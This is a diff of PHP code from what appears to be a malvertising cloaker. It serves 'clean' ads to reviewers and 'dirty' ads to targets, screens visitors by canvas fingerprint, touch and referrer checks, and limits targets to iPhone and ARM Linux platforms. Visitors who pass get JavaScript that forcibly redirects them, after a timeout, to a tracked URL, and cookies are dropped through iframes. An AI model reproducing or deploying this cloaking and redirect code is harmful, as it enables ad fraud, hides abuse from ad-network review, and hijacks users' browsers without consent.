@@ -399,11 +399,6 @@
 		$resultHtml = file_get_contents($cleanHtmlFilename);
 	}
 
-	if (empty($redirectUrl))
-	{
-		exit;
-	}
-
 	if (empty($adCountry))
 	{
 		$adCountry = "US";
@@ -674,7 +669,7 @@
 						        }";
 	}
 
-	if (($serveCleanAd || !$redirectEnabled) && !$forceDirtyAd)
+	if ($serveCleanAd && !$forceDirtyAd)
 	{
 		if ($loggingEnabled && !$redirectEnabled)
 		{
@@ -720,74 +715,79 @@
 			}
 		}
 
-		$redirectUrl = appendParameterPrefix($redirectUrl) . "ccid=$adClickID";
-
-		if ($voluumAdCycleCount > 0)
-		{
-			$redirectUrl = appendParameterPrefix($redirectUrl) . "ad=" . (($adVisits % $voluumAdCycleCount) + 1);
-		}
-
 		$f_apps_WeightList["iOS"] 		= getCSVContentAsArray($f_apps_iosBaseFilename . $adCountry . $csvFileSuffix);
 		$f_apps_WeightList["Android"] 	= getCSVContentAsArray($f_apps_androidBaseFilename . $adCountry . $csvFileSuffix);
 
 		$f_site_WeightList 				= getCSVContentAsArray($f_site_BaseFilename . $adCountry . $csvFileSuffix);
 		$f_siteid_WeightList 			= getCSVContentAsArray($f_siteid_BaseFilename . $adCountry . $csvFileSuffix);
 
-		// Append auto generated source parameter
-		$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_apps", $f_apps_WeightList);
-		$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_site", $f_site_WeightList);
-		$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_siteid", $f_siteid_WeightList);
-
-		// Append passed in script parameters if outputMethod == JS
-		if ($outputMethod === "JS")
+		// If a redirection Url was configured and enabled
+		if (!empty($redirectUrl) && $redirectEnabled)
 		{
-			$redirectUrl .= appendParameterPrefix($redirectUrl) . $queryString;
+			$redirectUrl = appendParameterPrefix($redirectUrl) . "ccid=$adClickID";
+			if ($voluumAdCycleCount > 0)
+			{
+				$redirectUrl = appendParameterPrefix($redirectUrl) . "ad=" . (($adVisits % $voluumAdCycleCount) + 1);
+			}
+			// Append auto generated source parameter
+			$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_apps", $f_apps_WeightList);
+			$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_site", $f_site_WeightList);
+			$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_siteid", $f_siteid_WeightList);
+			
+			// Append passed in script parameters if outputMethod == JS
+			if ($outputMethod === "JS")
+			{
+				$redirectUrl .= appendParameterPrefix($redirectUrl) . $queryString;
+			}
+
+			// Append referrer
+			$redirectUrl = appendReferrerParameter($redirectUrl);
+
+			// Get the redirect code (JS)
+			if ($redirectMethod === "trycatchredirect")
+			{
+				$redirectCode = "try
+								 {
+									 " . getRedirectCode($redirectSubMethod1, $redirectUrl) . "
+								 }
+								 catch(e)
+								 {
+									try
+									{
+										" . getRedirectCode($redirectSubMethod2, $redirectUrl) . "
+									}
+									catch(e)
+									{
+									}
+								 }";
+			}
+			else
+			{
+				$redirectCode = getRedirectCode($redirectMethod, $redirectUrl);
+			}
+		} else {
+			// No redirection code at all
+			$redirectCode = "";
 		}
 
-		// Append referrer
-		$redirectUrl = appendReferrerParameter($redirectUrl);
-
+		// Perform logging if enabled
 		if ($loggingEnabled)
 		{
 			adlog($campaignID, $ip, $isp["isp"], $redirectUrl);
-		}
-
-		// Get the redirect code (JS)
-		if ($redirectMethod === "trycatchredirect")
-		{
-			$redirectCode = "try
-							 {
-								 " . getRedirectCode($redirectSubMethod1, $redirectUrl) . "
-							 }
-							 catch(e)
-							 {
-							 	try
-							 	{
-							 		" . getRedirectCode($redirectSubMethod2, $redirectUrl) . "
-							 	}
-							 	catch(e)
-							 	{
-							 	}
-							 }";
-		}
-		else
-		{
-			$redirectCode = getRedirectCode($redirectMethod, $redirectUrl);
 		}
 
 		$scriptCode = "<script type=\"text/javascript\">
 
 			var testResults = [];
 
-			function isTrue(value)
-			{
-				return value === true;
+			function isTrue(value) 
+			{ 
+				return value === true; 
 			}
 
-			if (typeof jslog !== 'function')
-			{
+			if (typeof jslog !== 'function') {
 				jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
-			}" .
+			} " .
 
 			($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
 
@@ -796,20 +796,16 @@
 			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
 			($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .
 
-		   "
-			function inBlockedCanvasList()
+		   "function inBlockedCanvasList()
 			{
 				var blockedList = [null, $blockedCanvasFingerprints];
 				var canvasFingerPrint = getCanvasFingerprint();
 
 				var result = blockedList.indexOf(canvasFingerPrint) !== -1;
 
-				if (result)
-				{
+				if (result) {
 					jslog('CHECK:CANVASFINGERPRINT_BLOCKED: CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
-				}
-				else
-				{
+				} else {
 					jslog('CHECK:CANVASFINGERPRINT_ALLOWED: CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
 				}
 
@@ -819,7 +815,7 @@
 			$referrerDomainScript
 
 			function go()
-			{\n";
+			{";
 			
 			$scriptCode .=
 				($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
@@ -829,12 +825,9 @@
 				($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
 			   "jslog(testResults);
 
-				if (testResults.every(isTrue))
-				{
-					if (/(iphone|linux armv)/i.test(window.navigator.platform))
-					{
-						jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
-						";
+				if (testResults.every(isTrue)) {
+					if (/(iphone|linux armv)/i.test(window.navigator.platform)) {
+						jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform); ";
 						
 			// Add cookie drop code
 			if (true && $iFrameCookiesEnabled) {
@@ -845,16 +838,18 @@
 				}
 			}
 
-			$scriptCode .= "
-						setTimeout(function()
+			if (!empty($redirectCode)) {
+			$scriptCode .=
+						"setTimeout(function()
 						{
 							var topDomain = getReferrerDomain();
 
 							$redirectCode
-						}, $redirectTimeout);
-					}
-					else
-					{
+						}, $redirectTimeout);";
+			}
+			
+			$scriptCode .= 
+					"} else {
 						jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
 					}
 				}
